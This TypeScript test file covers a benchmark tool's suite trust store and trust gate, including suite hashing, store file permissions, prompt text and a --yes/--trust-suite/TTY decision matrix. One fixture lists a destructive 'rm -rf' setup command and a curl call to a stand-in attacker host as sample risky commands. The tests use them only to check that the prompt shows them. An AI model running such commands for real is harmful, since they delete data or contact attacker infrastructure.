// bench/trust.ts (the suite trust store) + commands/bench.ts's ensureSuiteTrusted flag/TTY
// decision matrix. Mirrors test/unit/bench-infra.test.ts's tmpdir conventions. No real agent
// runs here — ensureSuiteTrusted is exported from commands/bench.ts specifically so this file
// can exercise the trust gate without going anywhere near orchestrate()/a real runner.

import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  statSync,
  writeFileSync,
} from "node:fs";
import { mkdir, readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import type { ConfigVariant } from "../../src/bench/run.js";
import type { BenchTask } from "../../src/bench/suite.js";
import {
  computeSuiteHash,
  formatTrustPrompt,
  isSuiteTrusted,
  loadTrustStore,
  trustSuite,
} from "../../src/bench/trust.js";
import {
  type BenchRunCommandOptions,
  ensureSuiteTrusted,
} from "../../src/commands/bench.js";

function tmpDir(prefix: string): string {
  return mkdtempSync(join(tmpdir(), prefix));
}

function writeTask(dir: string, filename: string, task: BenchTask): void {
  writeFileSync(join(dir, filename), JSON.stringify(task));
}

const CURRENT_PAIR: [ConfigVariant, ConfigVariant] = [
  { name: "current", dir: "current" },
  { name: "current-b", dir: "current" },
];

// ---------------------------------------------------------------------------
// computeSuiteHash — stability + change detection.
// ---------------------------------------------------------------------------

describe("computeSuiteHash", () => {
  it("is stable across repeated calls over unchanged inputs", async () => {
    const dir = tmpDir("peek-trust-suite-");
    writeTask(dir, "a.json", { name: "a", prompt: "p", verify: "true" });

    const h1 = await computeSuiteHash(dir, CURRENT_PAIR);
    const h2 = await computeSuiteHash(dir, CURRENT_PAIR);
    expect(h1).toBe(h2);
    expect(h1).toMatch(/^[0-9a-f]{64}$/); // sha256 hex
  });

  it("changes when a task's verify command is edited", async () => {
    const dir = tmpDir("peek-trust-suite-");
    writeTask(dir, "a.json", { name: "a", prompt: "p", verify: "true" });
    const before = await computeSuiteHash(dir, CURRENT_PAIR);

    writeTask(dir, "a.json", { name: "a", prompt: "p", verify: "false" });
    const after = await computeSuiteHash(dir, CURRENT_PAIR);

    expect(after).not.toBe(before);
  });

  it("changes when a task's setup command is edited", async () => {
    const dir = tmpDir("peek-trust-suite-");
    writeTask(dir, "a.json", {
      name: "a",
      prompt: "p",
      verify: "true",
      setup: ["echo one"],
    });
    const before = await computeSuiteHash(dir, CURRENT_PAIR);

    writeTask(dir, "a.json", {
      name: "a",
      prompt: "p",
      verify: "true",
      setup: ["echo two"],
    });
    const after = await computeSuiteHash(dir, CURRENT_PAIR);

    expect(after).not.toBe(before);
  });

  it("changes when a task file is added", async () => {
    const dir = tmpDir("peek-trust-suite-");
    writeTask(dir, "a.json", { name: "a", prompt: "p", verify: "true" });
    const before = await computeSuiteHash(dir, CURRENT_PAIR);

    writeTask(dir, "b.json", { name: "b", prompt: "p", verify: "true" });
    const after = await computeSuiteHash(dir, CURRENT_PAIR);

    expect(after).not.toBe(before);
  });

  it("changes when a non-'current' config variant's overlay file content changes", async () => {
    const suiteDir = tmpDir("peek-trust-suite-");
    writeTask(suiteDir, "a.json", { name: "a", prompt: "p", verify: "true" });
    const variantDir = tmpDir("peek-trust-variant-");
    writeFileSync(join(variantDir, "CLAUDE.md"), "rule v1");
    const configs: [ConfigVariant, ConfigVariant] = [
      { name: "current", dir: "current" },
      { name: "variant", dir: variantDir },
    ];

    const before = await computeSuiteHash(suiteDir, configs);
    writeFileSync(join(variantDir, "CLAUDE.md"), "rule v2");
    const after = await computeSuiteHash(suiteDir, configs);

    expect(after).not.toBe(before);
  });

  it("is unaffected by config dir contents when both configs are 'current'", async () => {
    const suiteDir = tmpDir("peek-trust-suite-");
    writeTask(suiteDir, "a.json", { name: "a", prompt: "p", verify: "true" });

    // "current" is a sentinel, not a real path — never read from disk.
    const h1 = await computeSuiteHash(suiteDir, CURRENT_PAIR);
    const h2 = await computeSuiteHash(suiteDir, [
      { name: "current", dir: "current" },
      { name: "current-b", dir: "current" },
    ]);
    expect(h1).toBe(h2);
  });
});

// ---------------------------------------------------------------------------
// Store round-trip + permissions.
// ---------------------------------------------------------------------------

describe("trust store", () => {
  let storePath: string;

  beforeEach(() => {
    const dir = tmpDir("peek-trust-store-");
    storePath = join(dir, "nested", "trusted-suites.json");
  });

  it("loadTrustStore returns an empty store for a missing file", async () => {
    expect(await loadTrustStore(storePath)).toEqual({});
    expect(await isSuiteTrusted("deadbeef", storePath)).toBe(false);
  });

  it("round-trips a trusted hash: trustSuite -> isSuiteTrusted -> loadTrustStore", async () => {
    const hash = "a".repeat(64);
    await trustSuite(hash, "/some/suite", storePath);

    expect(await isSuiteTrusted(hash, storePath)).toBe(true);
    const store = await loadTrustStore(storePath);
    expect(store[hash]?.suitePath).toBe("/some/suite");
    expect(typeof store[hash]?.firstTrustedAt).toBe("string");
    expect(new Date(store[hash]?.firstTrustedAt ?? "").getTime()).not.toBeNaN();
  });

  it("writes the store dir as 0700 and the store file as 0600", async () => {
    await trustSuite("a".repeat(64), "/some/suite", storePath);
    expect(statSync(dirname(storePath)).mode & 0o777).toBe(0o700);
    expect(statSync(storePath).mode & 0o777).toBe(0o600);
  });

  it("tightens a pre-existing loosely-permissioned store dir/file on load", async () => {
    await mkdir(dirname(storePath), { recursive: true });
    await writeFile(storePath, "{}", "utf8");
    const { chmodSync } = await import("node:fs");
    chmodSync(dirname(storePath), 0o755);
    chmodSync(storePath, 0o644);

    await loadTrustStore(storePath);

    expect(statSync(dirname(storePath)).mode & 0o777).toBe(0o700);
    expect(statSync(storePath).mode & 0o777).toBe(0o600);
  });

  it("ignores a corrupt store file (treats it as empty, never throws)", async () => {
    mkdirSync(dirname(storePath), { recursive: true });
    writeFileSync(storePath, "{ not valid json", "utf8");
    expect(await loadTrustStore(storePath)).toEqual({});
  });

  it("preserves the original firstTrustedAt/suitePath when re-trusting an already-trusted hash", async () => {
    const hash = "b".repeat(64);
    mkdirSync(dirname(storePath), { recursive: true });
    writeFileSync(
      storePath,
      JSON.stringify({
        [hash]: {
          firstTrustedAt: "2020-01-01T00:00:00.000Z",
          suitePath: "/old/path",
        },
      }),
      "utf8",
    );

    await trustSuite(hash, "/new/path", storePath);

    const store = await loadTrustStore(storePath);
    expect(store[hash]?.firstTrustedAt).toBe("2020-01-01T00:00:00.000Z");
    expect(store[hash]?.suitePath).toBe("/old/path");
  });

  it("a changed suite hash is untrusted even when a different hash for the same suite path was trusted", async () => {
    await trustSuite("c".repeat(64), "/some/suite", storePath);
    expect(await isSuiteTrusted("d".repeat(64), storePath)).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// formatTrustPrompt — every setup/verify command shown verbatim.
// ---------------------------------------------------------------------------

describe("formatTrustPrompt", () => {
  it("lists every task's setup/verify commands verbatim and the task count", async () => {
    const suite: BenchTask[] = [
      {
        name: "risky-task",
        prompt: "do the risky thing",
        setup: ["rm -rf /tmp/scratch", "echo ready"],
        verify: "curl http://evil.example/callback",
      },
    ];
    const text = await formatTrustPrompt("/some/suite", suite, CURRENT_PAIR);

    expect(text).toContain("1 task");
    expect(text).toContain("risky-task");
    expect(text).toContain("rm -rf /tmp/scratch");
    expect(text).toContain("echo ready");
    expect(text).toContain("curl http://evil.example/callback");
    expect(text).toContain("Trust this suite?");
  });

  it("lists a non-'current' config variant's overlay files", async () => {
    const variantDir = tmpDir("peek-trust-variant-");
    writeFileSync(join(variantDir, "CLAUDE.md"), "rule");
    writeFileSync(join(variantDir, "model"), "claude-haiku\n");
    const configs: [ConfigVariant, ConfigVariant] = [
      { name: "current", dir: "current" },
      { name: "variant", dir: variantDir },
    ];
    const text = await formatTrustPrompt(
      "/some/suite",
      [{ name: "t", prompt: "p", verify: "true" }],
      configs,
    );

    expect(text).toContain(`config-b (variant): ${variantDir}`);
    expect(text).toContain("CLAUDE.md");
    expect(text).toContain("model");
  });
});

// ---------------------------------------------------------------------------
// ensureSuiteTrusted — flag/TTY decision matrix.
// ---------------------------------------------------------------------------

describe("ensureSuiteTrusted flag/TTY matrix", () => {
  let suiteDir: string;
  let storePath: string;
  let origIsTTY: typeof process.stdin.isTTY;
  let origExitCode: typeof process.exitCode;

  beforeEach(() => {
    suiteDir = tmpDir("peek-trust-matrix-suite-");
    writeTask(suiteDir, "a.json", { name: "a", prompt: "p", verify: "true" });
    storePath = join(tmpDir("peek-trust-matrix-store-"), "trusted-suites.json");
    origIsTTY = process.stdin.isTTY;
    origExitCode = process.exitCode;
  });

  afterEach(() => {
    process.stdin.isTTY = origIsTTY;
    process.exitCode = origExitCode;
  });

  function opts(
    extra: Partial<BenchRunCommandOptions> = {},
  ): BenchRunCommandOptions {
    return {
      suite: suiteDir,
      configA: "current",
      configB: "current",
      trustStorePathOverride: storePath,
      ...extra,
    };
  }

  it("trusted + --yes proceeds without touching stdin", async () => {
    const hash = await computeSuiteHash(suiteDir, CURRENT_PAIR);
    await trustSuite(hash, suiteDir, storePath);

    // Force non-TTY so a bug that DID consult stdin would fail loudly rather than hang.
    process.stdin.isTTY = false;

    const result = await ensureSuiteTrusted(
      opts({ yes: true }),
      [{ name: "a", prompt: "p", verify: "true" }],
      { name: "current", dir: "current" },
      { name: "current-b", dir: "current" },
    );

    expect(result).toBe(true);
    expect(await isSuiteTrusted(hash, storePath)).toBe(true);
  });

  it("untrusted + --yes + no --trust-suite aborts on non-TTY stdin", async () => {
    process.stdin.isTTY = false;

    const result = await ensureSuiteTrusted(
      opts({ yes: true, trustSuite: false }),
      [{ name: "a", prompt: "p", verify: "true" }],
      { name: "current", dir: "current" },
      { name: "current-b", dir: "current" },
    );

    expect(result).toBe(false);
    expect(process.exitCode).toBe(1);
    const hash = await computeSuiteHash(suiteDir, CURRENT_PAIR);
    expect(await isSuiteTrusted(hash, storePath)).toBe(false);
  });

  it("--trust-suite records the hash without prompting, even on non-TTY stdin", async () => {
    process.stdin.isTTY = false;

    const result = await ensureSuiteTrusted(
      opts({ trustSuite: true }),
      [{ name: "a", prompt: "p", verify: "true" }],
      { name: "current", dir: "current" },
      { name: "current-b", dir: "current" },
    );

    expect(result).toBe(true);
    const hash = await computeSuiteHash(suiteDir, CURRENT_PAIR);
    expect(await isSuiteTrusted(hash, storePath)).toBe(true);
  });

  it("a suite change after trust forces re-prompting (new hash is untrusted)", async () => {
    const originalHash = await computeSuiteHash(suiteDir, CURRENT_PAIR);
    await trustSuite(originalHash, suiteDir, storePath);

    // Edit the task after trust was recorded — the old hash no longer matches.
    writeTask(suiteDir, "a.json", { name: "a", prompt: "p", verify: "false" });

    process.stdin.isTTY = false;
    const result = await ensureSuiteTrusted(
      opts({ yes: true, trustSuite: false }),
      [{ name: "a", prompt: "p", verify: "false" }],
      { name: "current", dir: "current" },
      { name: "current-b", dir: "current" },
    );

    // Non-TTY + no --trust-suite -> hard abort, same as any other untrusted suite.
    expect(result).toBe(false);
    expect(process.exitCode).toBe(1);
  });
});

// ---------------------------------------------------------------------------
// README claim: the Bench safety paragraph documents the trust gate and that --yes
// doesn't bypass it. A lightweight doc-drift guard, not a full prose check.
// ---------------------------------------------------------------------------

describe("README Bench safety paragraph", () => {
  it("documents that --yes does not bypass the trust requirement", () => {
    const readmePath = join(process.cwd(), "README.md");
    const readme = readFileSync(readmePath, "utf8");
    const safetyParagraphStart = readme.indexOf("**Safety, by design:**");
    expect(safetyParagraphStart).toBeGreaterThan(-1);
    const paragraphEnd = readme.indexOf("\n\n", safetyParagraphStart);
    const paragraph = readme.slice(safetyParagraphStart, paragraphEnd);

    expect(paragraph).toMatch(/trust/i);
    expect(paragraph).toContain("--trust-suite");
    expect(paragraph).toMatch(/--yes.{0,40}never/i);
  });
});
